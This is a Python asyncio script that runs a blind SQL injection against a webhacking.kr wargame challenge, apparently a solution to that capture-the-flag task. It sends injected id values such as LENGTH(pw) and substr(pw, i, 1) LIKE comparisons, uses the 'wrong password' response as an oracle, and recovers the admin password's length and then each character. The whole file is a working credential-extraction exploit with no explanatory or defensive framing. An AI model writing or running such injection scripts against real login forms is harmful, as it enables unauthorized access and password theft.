import asyncio
import aiohttp
import string

URL = "https://webhacking.kr/challenge/bonus-1/index.php"

semaphore = asyncio.Semaphore(5)  # Limit concurrent requests

async def fetch(session, payload):
    params = {"id": payload, "pw": "1"}
    timeout = aiohttp.ClientTimeout(total=10)  # Increase timeout duration
    try:
        async with session.post(URL, params=params, timeout=timeout) as response:
            return await response.text()
    except asyncio.TimeoutError:
        # print(f"Timeout occurred for payload: {payload}")
        return "timeout"  # Placeholder for timeout

async def find_password_length(session):
    for length in range(1, 50):  # Adjust the range based on expected max length
        payload = f"admin' and LENGTH(pw) like {length} -- "
        response = await fetch(session, payload)
        if "wrong password" in response:
            print(f"Password length found: {length}")
            return length
    return None  # Return None if length not found

async def main():
    async with aiohttp.ClientSession() as session:
        password_length = await find_password_length(session)
        if password_length is None:
            print("Could not determine password length.")
            return
        
        password = ""
        i = 1
        character_set = "_" + string.ascii_letters + string.digits + "{" + "}" + "-" + "?"

        while len(password) < password_length:
            tasks = []
            for c in character_set:  # Iterate through character set
                payload = f"admin' and substr(pw, {i}, 1) LIKE'{c}' -- ".replace("_", r"\_")
                tasks.append(fetch(session, payload))

                # await asyncio.sleep(0.1)  # Delay between requests

            responses = await asyncio.gather(*tasks)

            for index, response in enumerate(responses):
                if index < len(character_set) and "wrong password" in response:
                    c = character_set[index]  # Correctly access character from character set
                    password += c
                    print(password.ljust(password_length, '*'))
                    break
            
            i += 1  # Move to the next character position

if __name__ == "__main__":
    asyncio.run(main())
